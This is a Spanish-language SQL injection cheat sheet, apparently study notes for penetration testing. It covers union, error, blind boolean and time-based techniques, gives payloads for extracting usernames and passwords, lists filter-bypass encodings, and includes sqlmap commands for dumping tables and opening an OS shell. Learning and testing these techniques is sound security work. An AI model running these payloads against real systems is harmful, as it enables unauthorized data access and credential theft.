# 💡 Explicación
---
SQL Injection permite a un atacante manipular consultas SQL mediante inyección de código malicioso en campos de entrada no validados. 

```
https://.../shop.php?id=1' UNION SELECT NULL -- -
```

- **Error-Based**: Devuelve errores SQL visibles

- **Union-Based**: Combinación de consultas SELECT

- **Blind Boolean-Based**: Cambios en página basados en T/F

- **Blind Time-Based**: Usa SLEEP() para confirmar

Para detectar un endpoint vulnerable a SQLi, primero buscamos parámetros GET, POST o cookies e inyectamos cosas muy simples:

```
'
"
)
etc.
```

Si vemos cambios o errores según lo que inyectamos, hay un potencial endpoint vulnerable, por lo que buscamos un payload inyectable. Estos payloads funcionarán o no dependiendo de la estructura interna de la consulta:

```
-- Prueba 1 ------------------------------------------------------------

' AND 1=1--
' AND 1=2--

# Si una funciona y la otra cambia la respuesta (o rompe), estás inyectando una condición booleana tipo ... WHERE algo = 'TU_INPUT'. 

(Posible Union-Based SQLi, siempre y cuando se muestre la salida de la BBDD)

-- Prueba 2 ------------------------------------------------------------

'||'a'||'
'||(SELECT 'a')||'

'||(SELECT '' FROM dual)||' → Oracle

# Si estos dejan de dar error, tu parámetro se usa como texto (`... 'xyz' || TU_INPUT || ''`).

```

Podemos diferenciar los siguientes tipos:

### 1️⃣ **Union-based**
---

💡 **¿Cómo funciona?** → Aprovecha el operador `UNION` para combinar resultados de consultas múltiples. El atacante debe conocer el número correcto de columnas y sus tipos de datos.

```
' UNION SELECT username, password FROM users--
```

Para que funcione un UNION attack, DEBEN cumplirse dos condiciones:​

- <u>Mismo número de columnas</u>: Las consultas individuales deben devolver el mismo número de columnas.
-  <u>Tipos de datos compatibles</u>: Los datos en cada columna deben ser compatibles entre consultas.

🔎 **¿Cómo lo hacemos?** → Para localizar y explotar un UNION-based SQLi:

1. *Determinar el número de columnas*:

```
-- OPCION 1 ------------------------------------------------------

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Éxito → Cuando el índice excede las columnas reales, aparece error

-- OPCION 2 ------------------------------------------------------

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Éxito → Cuando coincide el número de columnas, NO hay error.
```

2. *Identificar columnas con el tipo de dato String*:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

# Éxito → Si NO hay error y la respuesta contiene la `'a'` inyectada, esa columna acepta strings.
```

3. *Buscamos tablas y columnas*: 

```
-- ORACLE ----------------------------------------------------------

' UNION SELECT * FROM all_tables  
' UNION SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'

-- MSSQL, PostgreSQL, MySQL ----------------------------------------

' UNION SELECT * FROM information_schema.tables  
' UNION SELECT * FROM information_schema.columns WHERE table_name ='TABLE-NAME'

```

4. *Extraemos datos*:

```
' UNION SELECT username, password FROM users--
```
	
	Si la consulta solo devuelve una columna: 
	
```
-- ORACLE, PostgreSQL ---------------------------------------------

' UNION SELECT username || '~' || password FROM users--

-- MSSQL ----------------------------------------------------------

' UNION SELECT username + '~' + password FROM users--

-- MySQL ----------------------------------------------------------

' UNION SELECT username '~' password FROM users--

```

### 2️⃣ **Error-based**
---

💡 **¿Cómo funciona?** → Fuerza errores SQL deliberados para extraer información de los mensajes de error. La base de datos revela detalles en los mensajes de fallo. 

```
' AND CAST((SELECT password FROM users WHERE username='admin') AS INT)--

# Éxito → Se produce un error del tipo 
ERROR: "invalid input syntax for type integer: "Example data" 
# mostrando parte de los datos (en este caso, la contraseña) en el mensaje
```

### 3️⃣ **Blind Boolean-based**
---

💡 **¿Cómo funciona?** → Inyecta condiciones verdaderas/falsas y observa cambios en el comportamiento de la aplicación (página diferente, contenido, estado 200 vs 404).

```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--

# Éxito → La primera petición no arroja error (1=2 es falso, ELSE 1); 
la segunda sí (1=1 es cierto, se evalúa 1/0).
```
	
	En la práctica, podemos utilizar esto para obtener información
	
```
' AND (SELECT CASE WHEN (SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users WHERE Username = 'Admin' AND )='a
```

### 4️⃣ **Blind Time-based**
---

💡 **¿Cómo funciona?** → Usa funciones de retraso (`SLEEP()`, `WAITFOR`, `BENCHMARK()`) para inferir si condiciones son verdaderas/falsas según el tiempo de respuesta del servidor.

```
-- MySQL ---------------------

?id=1' AND SLEEP(5)-- 
?id=1' OR SLEEP(5)--

-- PostgreSQL ----------------

?id=1' AND pg_sleep(5)--
?id=1' OR pg_sleep(5)--

-- SQL server ----------------

?id=1'; WAITFOR DELAY '0:0:5'--

-- Oracle --------------------

?id=1' AND DBMS_LOCK.SLEEP(5)--

```

# 🎯 Finalidad 
---

La finalidad del SQLi es conseguir acceso a datos de la BBDD a los que no se debería poder acceder. Estos son los archivos importante para recordar.

**Bases de datos**:

```
information_schema
mysql
wordpress
shop
```

**Tablas típicas**:

```
users
admin
customers
products
orders
```

**Columnas típicas**:

```
username
password
email
id
admin
is_admin
```

# ✋🏻 Bypasses
---

Para bypassear algunas medidas débiles de seguridad, podemos realizar los siguientes bypasses:

- **URL encoding**: `1%27%20OR%201%3D1`
- **Doble encoding**: `%252F`
- **Ofuscación**: `UnIoN SeLeCt`
- **Hex Encoding**: `0x31 OR 0x31=0x31

# 🔧 Herramientas
---

Para SQLi, la herramienta más conocida es SQLmap. Aquí se explica su uso:

``` bash
# Básico
sqlmap -u "http://target.com/?id=1" --dbs --batch

# Obtener datos específicos
sqlmap -u "http://target.com/?id=1" -D wordpress -T users --dump

# Con POST
sqlmap -u "http://target.com/login" --data="user=test&pass=test" --dbs

# CON BYPASS WAF
sqlmap -u "http://target.com/?id=1" --tamper=space2comment --level=5 --risk=3

# Obtener shell
sqlmap -u "http://target.com/?id=1" --os-shell
```

- `-a` / `--all` → sacar “todo” lo posible

- `--banner` → versión del DBMS

- `--current-user` → usuario actual

- `--current-db` → base de datos actual

- `--dbs` → listar bases de datos

- `-D db -T tabla -C col --dump` → volcar datos específicos[](https://www.stationx.net/sqlmap-cheat-sheet/)
​
# 🔗 Referencias
---

https://portswigger.net/web-security/sql-injection/cheat-sheet